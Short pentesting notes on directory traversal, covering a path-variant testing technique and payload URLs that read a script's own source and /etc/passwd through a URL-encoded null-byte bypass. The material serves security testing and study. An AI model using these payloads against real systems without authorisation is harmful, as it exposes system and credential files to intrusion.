# Directory Traversal

## References

- [Directory Traversal](https://pentestlab.blog/2012/06/29/directory-traversal-cheat-sheet/)
- [Null Byte Injection](http://projects.webappsec.org/w/page/13246949/Null%20Byte%20Injection)

As with other vulnerabilities, you can use the "same value technique" to test for this type of issue. For example, if the path used by the application inside a parameter is /images/photo.jpg. You can try to access:

- `/images/./photo.jpg`: you should see the same file.
- `/images/../photo.jpg`: you should get an error.
- `/images/../images/photo.jpg`: you should see the same file again.
- `/images/../IMAGES/photo.jpg`: you should get an error(depending on the file system) or something weird is going on.

## Key things to remember

### Retrieve code itself

> http://purl/file.php?file=/../../file.php

### NULL BYTE (Null Byte Injection)

The server-side code adds its own suffix to your payload. This can be easily bypassed, by using a NULL BYTE

> Which you need to URL-encode as %00

Exploitation:
```
Normal: http://www.example.host/user.php?file=myprofile.dat
Attacking: http://www.example.host/user.php?file=../../../etc/passwd%00

Normal: http://www.example.host/user.php?file=myprofile.dat
Attacking: http://www.example.host/user.php?file=../../../etc/passwd%00
```
